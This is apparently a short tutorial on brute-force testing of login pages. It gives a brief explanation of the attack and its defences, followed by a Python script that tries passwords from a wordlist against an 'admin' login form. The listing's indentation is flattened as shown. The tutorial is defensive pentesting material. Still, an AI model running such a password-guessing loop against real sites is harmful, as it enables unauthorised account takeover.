Brute Force Login Page Testing

What is Brute Force Attack on Login Pages?

A Brute Force Attack on login pages is a method used to gain unauthorized access to a system by systematically trying all possible combinations of usernames and passwords until the correct one is found. This attack is typically automated using scripts that attempt thousands of password guesses per second.


Why is it Important in Ethical Hacking and Penetration Testing?

This technique is essential in ethical hacking to identify weak login systems that use predictable or default credentials. It can help identify:

  • Systems vulnerable to password spraying
  • Lack of account lockout mechanisms
  • Unprotected admin portals
  • Weak or default user credentials

Ethical testing helps organizations enforce stronger security controls such as rate-limiting, account lockout, and multi-factor authentication.

Python Code: Brute Force Login Testing


import requests

# Target login URL (replace with actual one you're testing ethically)
url = "http://example.com/login"

# Username to test
username = "admin"

# Path to password list
wordlist = "passwords.txt"

# Adjust form field names to match the target site's login form
for password in open(wordlist, "r"):
password = password.strip()
data = {
"username": username,
"password": password
}
response = requests.post(url, data=data)

if "Invalid" not in response.text: # Update based on login failure message
print(f"[+] Password found: {password}")
break
else:
print(f"[-] Trying: {password}")
else:
print("[-] Password not found.")
